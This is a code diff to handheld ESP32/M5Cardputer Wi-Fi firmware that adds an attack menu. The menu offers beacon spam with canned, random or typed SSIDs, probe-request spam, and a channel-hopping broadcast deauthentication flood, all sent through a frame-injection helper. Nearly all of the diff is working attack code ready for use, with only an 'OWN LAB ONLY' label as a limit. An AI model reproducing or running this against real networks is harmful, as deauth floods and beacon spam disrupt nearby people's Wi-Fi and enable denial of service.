@@ -20,6 +20,7 @@
 #include <WiFi.h>
 #include <esp_wifi.h>
 #include <NimBLEDevice.h>  // For BLE coexistence check
+#include <M5Cardputer.h>   // Attack overlay drawing + keys
 #include <SD.h>
 #include <algorithm>
 #include <cstdarg>  // For va_list in deferred logging
@@ -188,6 +189,29 @@ bool OinkMode::targetCacheValid = false;
 DetectedClient OinkMode::targetClients[MAX_CLIENTS_PER_NETWORK] = {};
 uint8_t OinkMode::targetClientCount = 0;
 int OinkMode::selectionIndex = 0;
+
+// ---- Attack selector state ----
+static const char* const kAtkCannedSsids[] = {
+    "PIG_ON_AIR", "FREE_WIFI_TRUFFLE", "OINKNET_5G", "BOAR_BAND",
+    "HOGSPOT", "SLOP_STATION", "SWINE_SLAVE", "TRUFFLE_TROUGH",
+    "HAM_HOUSE", "PORKCHOP_PWN", "BA beacon? NO", "FERAL_2.4"
+};
+static constexpr uint8_t kAtkCannedCount =
+    sizeof(kAtkCannedSsids) / sizeof(kAtkCannedSsids[0]);
+static constexpr uint32_t kAtkFrameIntervalMs = 100;   // ~10 frames/s
+static constexpr uint32_t kAtkFloodIntervalMs = 180;   // deauth burst cadence
+bool OinkMode::atkMenuOpen = false;
+bool OinkMode::atkMenuTyping = false;
+uint8_t OinkMode::atkMenuSel = 0;
+OinkMode::AttackKind OinkMode::atkKind = OinkMode::AttackKind::None;
+uint32_t OinkMode::atkFrames = 0;
+uint32_t OinkMode::atkLastFrameMs = 0;
+uint8_t OinkMode::atkChannel = 1;
+uint8_t OinkMode::atkSsidIdx = 0;
+uint8_t OinkMode::atkCannedCount = kAtkCannedCount;
+char OinkMode::atkCustomSsid[33] = {0};
+uint8_t OinkMode::atkCustomLen = 0;
+bool OinkMode::atkReconWasPaused = false;
 std::atomic<uint32_t> OinkMode::packetCount{0};
 uint32_t OinkMode::deauthCount = 0;
 uint16_t OinkMode::filteredCount = 0;
@@ -454,6 +478,11 @@ void OinkMode::stop() {
     
     Serial.println("[OINK] Stopping...");
     
+    // Attack extras: kill any running attack and close the selector first,
+    // so recon pause/resume and channel state settle before teardown.
+    stopAttack();
+    attackMenuClose();
+    
     deauthing = false;
     scanning = false;
     
@@ -513,6 +542,9 @@ void OinkMode::stop() {
 
 void OinkMode::update() {
     if (!running) return;
+    
+    // Attack selector senders: tick-driven, guarded, channel-hopping.
+    updateAttacks();
     
     uint32_t now = millis();
     
@@ -3485,4 +3517,292 @@ bool OinkMode::excludeNetworkByBSSID(const uint8_t* bssid, const char* ssidIn) {
     XP::addXP(XPEvent::BOAR_BRO_ADDED);  // +5 XP
     
     return true;
+}
+
+// ---- Attack selector: menu, guard, tick-driven senders ----
+
+uint8_t OinkMode::attackMenuItemCount() {
+    // Last entry doubles as STOP when an attack is running.
+    return 6;
+}
+
+const char* OinkMode::attackMenuItemName(uint8_t i) {
+    switch (i) {
+        case 0: return "BCN SPAM CANNED";
+        case 1: return "BCN SPAM RANDOM";
+        case 2: return "BCN SPAM CUSTOM";
+        case 3: return "PROBE SPAM";
+        case 4: return "DEAUTH HOP FLOOD";
+        case 5: return (atkKind != AttackKind::None) ? "STOP ATTACK" : "CLOSE";
+        default: return "";
+    }
+}
+
+void OinkMode::attackMenuToggle() {
+    if (atkMenuOpen) {
+        attackMenuClose();
+        return;
+    }
+    if (!running) return;
+    atkMenuOpen = true;
+    atkMenuTyping = false;
+    atkMenuSel = 0;
+    Serial.println("[OINK/ATK] attack menu open");
+}
+
+void OinkMode::attackMenuClose() {
+    atkMenuOpen = false;
+    atkMenuTyping = false;
+}
+
+void OinkMode::attackMenuMove(int8_t delta) {
+    if (!atkMenuOpen || atkMenuTyping) return;
+    int8_t s = (int8_t)atkMenuSel + delta;
+    if (s < 0) s = attackMenuItemCount() - 1;
+    if (s >= (int8_t)attackMenuItemCount()) s = 0;
+    atkMenuSel = (uint8_t)s;
+}
+
+void OinkMode::attackMenuType(char c) {
+    if (!atkMenuTyping || atkCustomLen >= 32) return;
+    if (c < 0x20 || c > 0x7E) return;
+    atkCustomSsid[atkCustomLen++] = c;
+    atkCustomSsid[atkCustomLen] = '\0';
+}
+
+void OinkMode::attackMenuErase() {
+    if (!atkMenuTyping || atkCustomLen == 0) return;
+    atkCustomSsid[--atkCustomLen] = '\0';
+}
+
+void OinkMode::attackMenuConfirmText() {
+    if (!atkMenuTyping) return;
+    atkMenuTyping = false;
+    // Empty buffer: fall back to the list, no attack started.
+    if (atkCustomLen == 0) return;
+    // Keep the menu open and let the normal select path run (guards and all):
+    // closing first would trip attackMenuSelect's !atkMenuOpen bail.
+    atkMenuSel = 2;  // CUSTOM entry owns the typed buffer
+    attackMenuSelect();
+}
+
+static bool attackPreconditionsOk() {
+    // Refuse with visible feedback when the pig isn't actually on air:
+    // recon must be running and the WiFi driver must not be OFF.
+    if (!NetworkRecon::isRunning()) {
+        Display::showToast("RECON ASLEEP. NO ATTACK.");
+        Serial.println("[OINK/ATK] refused: recon not running");
+        return false;
+    }
+    if (WiFi.getMode() == WIFI_MODE_NULL) {
+        Display::showToast("WIFI OFF. NO ATTACK.");
+        Serial.println("[OINK/ATK] refused: WiFi off");
+        return false;
+    }
+    return true;
+}
+
+void OinkMode::attackMenuSelect() {
+    if (!atkMenuOpen) return;
+    if (atkMenuTyping) {
+        attackMenuConfirmText();
+        return;
+    }
+
+    // STOP / CLOSE
+    if (atkMenuSel == 5) {
+        if (atkKind != AttackKind::None) {
+            stopAttack();
+            Display::showToast("ATTACK OVER. PIG CALM.");
+        } else {
+            attackMenuClose();
+        }
+        return;
+    }
+
+    // Guards before any TX
+    if (!attackPreconditionsOk()) return;
+
+    AttackKind kind;
+    switch (atkMenuSel) {
+        case 0: kind = AttackKind::BeaconCanned; break;
+        case 1: kind = AttackKind::BeaconRandom; break;
+        case 2:
+            // Custom needs a typed SSID first.
+            if (atkCustomLen == 0) {
+                atkMenuTyping = true;
+                return;
+            }
+            kind = AttackKind::BeaconCustom;
+            break;
+        case 3: kind = AttackKind::ProbeSpam; break;
+        case 4: kind = AttackKind::DeauthFloodHop; break;
+        default: return;
+    }
+
+    // Channel discipline: claim the radio from recon while attacking, the
+    // same pause/resume contract BACON and PIGSYNC use. Only on the FIRST
+    // start (None -> attack): re-running this on an attack switch would
+    // record our own pause as pre-existing and leak it on stopAttack.
+    if (atkKind == AttackKind::None) {
+        if (NetworkRecon::isRunning() && !NetworkRecon::isPaused()) {
+            NetworkRecon::pause();
+            atkReconWasPaused = false;
+        } else {
+            atkReconWasPaused = NetworkRecon::isPaused();
+        }
+    }
+
+    atkKind = kind;
+    atkFrames = 0;
+    atkLastFrameMs = 0;
+    atkChannel = 1;
+    attackMenuClose();
+    Serial.printf("[OINK/ATK] attack start kind=%u\n", (unsigned)kind);
+}
+
+void OinkMode::stopAttack() {
+    if (atkKind == AttackKind::None) return;
+    atkKind = AttackKind::None;
+    // Hand the radio back to recon if we paused it.
+    if (!atkReconWasPaused && NetworkRecon::isPaused()) {
+        NetworkRecon::resume();
+    }
+    Serial.println("[OINK/ATK] attack stopped");
+}
+
+void OinkMode::nextCannedSsid(char* out, size_t outLen) {
+    strncpy(out, kAtkCannedSsids[atkSsidIdx % kAtkCannedCount], outLen - 1);
+    out[outLen - 1] = '\0';
+    atkSsidIdx++;
+}
+
+void OinkMode::randomSsid(char* out, size_t outLen) {
+    static const char alphabet[] =
+        "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz0123456789_";
+    uint8_t len = 6 + (esp_random() % 8);  // 6..13 chars
+    if ((size_t)len >= outLen) len = (uint8_t)(outLen - 1);
+    for (uint8_t i = 0; i < len; i++) {
+        out[i] = alphabet[esp_random() % (sizeof(alphabet) - 1)];
+    }
+    out[len] = '\0';
+}
+
+void OinkMode::updateAttacks() {
+    if (atkKind == AttackKind::None) return;
+
+    const uint32_t interval =
+        (atkKind == AttackKind::DeauthFloodHop) ? kAtkFloodIntervalMs
+                                                : kAtkFrameIntervalMs;
+    uint32_t now = millis();
+    if (atkLastFrameMs != 0 && now - atkLastFrameMs < interval) return;
+    atkLastFrameMs = now;
+
+    char ssid[33];
+    uint8_t bssid[6];
+
+    switch (atkKind) {
+        case AttackKind::BeaconCanned:
+        case AttackKind::BeaconRandom:
+        case AttackKind::BeaconCustom:
+            if (atkKind == AttackKind::BeaconCanned) nextCannedSsid(ssid, sizeof(ssid));
+            else if (atkKind == AttackKind::BeaconRandom) randomSsid(ssid, sizeof(ssid));
+            else { strncpy(ssid, atkCustomSsid, sizeof(ssid) - 1); ssid[sizeof(ssid) - 1] = '\0'; }
+            esp_fill_random(bssid, 6);
+            bssid[0] = (bssid[0] & 0xFC) | 0x02;
+            if (WSLBypasser::sendBeaconFrame(ssid, strlen(ssid), bssid, atkChannel)) {
+                atkFrames++;
+            }
+            atkChannel = (atkChannel % 14) + 1;  // hop 1..14
+            break;
+
+        case AttackKind::ProbeSpam:
+            nextCannedSsid(ssid, sizeof(ssid));
+            if (WSLBypasser::sendProbeReqFrame(ssid, strlen(ssid), atkChannel)) {
+                atkFrames++;
+            }
+            atkChannel = (atkChannel % 14) + 1;
+            break;
+
+        case AttackKind::DeauthFloodHop: {
+            uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+            // Broadcast both directions like the targeted burst does, minus
+            // the per-frame jitter: flood cadence is the interval itself.
+            uint8_t fakeAp[6];
+            esp_fill_random(fakeAp, 6);
+            fakeAp[0] = (fakeAp[0] & 0xFC) | 0x02;
+            if (WSLBypasser::sendDeauthFrame(fakeAp, atkChannel, broadcast, 7)) {
+                atkFrames++;
+            }
+            if (WSLBypasser::sendDeauthFrame(fakeAp, atkChannel, fakeAp, 7)) {
+                // reverse direction; counter stays per-pair
+            }
+            atkChannel = (atkChannel % 14) + 1;
+            break;
+        }
+
+        default:
+            break;
+    }
+}
+
+const char* OinkMode::attackStatusLine() {
+    switch (atkKind) {
+        case AttackKind::BeaconCanned:  return "BCN CANNED";
+        case AttackKind::BeaconRandom:  return "BCN RANDOM";
+        case AttackKind::BeaconCustom:  return "BCN CUSTOM";
+        case AttackKind::ProbeSpam:     return "PROBE SPAM";
+        case AttackKind::DeauthFloodHop: return "DEAUTH FLOOD";
+        default:                        return "";
+    }
+}
+
+void OinkMode::drawAttackOverlay(M5Canvas& canvas) {
+    if (!atkMenuOpen) return;
+
+    // Modal box over the OINK avatar view.
+    const int boxW = 200;
+    const int boxH = 84;
+    const int boxX = (240 - boxW) / 2;
+    const int boxY = (107 - boxH) / 2;
+
+    canvas.fillRoundRect(boxX, boxY, boxW, boxH, 4, COLOR_BG);
+    canvas.drawRoundRect(boxX, boxY, boxW, boxH, 4, COLOR_FG);
+
+    uint16_t fg = getColorFG();
+    uint16_t bg = getColorBG();
+    (void)fg; (void)bg;
+
+    if (atkMenuTyping) {
+        canvas.setTextColor(COLOR_FG);
+        canvas.setTextDatum(TL_DATUM);
+        canvas.setFont(&fonts::Font0);
+        canvas.setTextSize(1);
+        canvas.drawString("CUSTOM SSID:", boxX + 6, boxY + 6);
+        canvas.setTextSize(2);
+        canvas.drawRect(boxX + 6, boxY + 22, boxW - 12, 16, COLOR_FG);
+        // Size-2 glyphs are 12px wide: cap the shown SSID to the 188px field.
+        char shown[16];
+        strncpy(shown, atkCustomSsid, 15);
+        shown[15] = '\0';
+        canvas.drawString(shown, boxX + 10, boxY + 25);
+        canvas.setTextSize(1);
+        canvas.drawString("TYPE. ENTER:GO BS:ERASE", boxX + 6, boxY + 64);
+        return;
+    }
+
+    canvas.setTextColor(COLOR_FG);
+    canvas.setTextDatum(TL_DATUM);
+    canvas.setFont(&fonts::Font0);
+    canvas.setTextSize(1);
+    canvas.drawString("ATTACKS (OWN LAB ONLY):", boxX + 6, boxY + 4);
+    int y = boxY + 16;
+    for (uint8_t i = 0; i < attackMenuItemCount(); i++) {
+        bool sel = (i == atkMenuSel);
+        if (sel) canvas.fillRect(boxX + 2, y - 1, boxW - 4, 11, COLOR_FG);
+        canvas.setTextColor(sel ? COLOR_BG : COLOR_FG);
+        canvas.drawString(attackMenuItemName(i), boxX + 6, y);
+        canvas.setTextColor(COLOR_FG);
+        y += 11;
+    }
 }
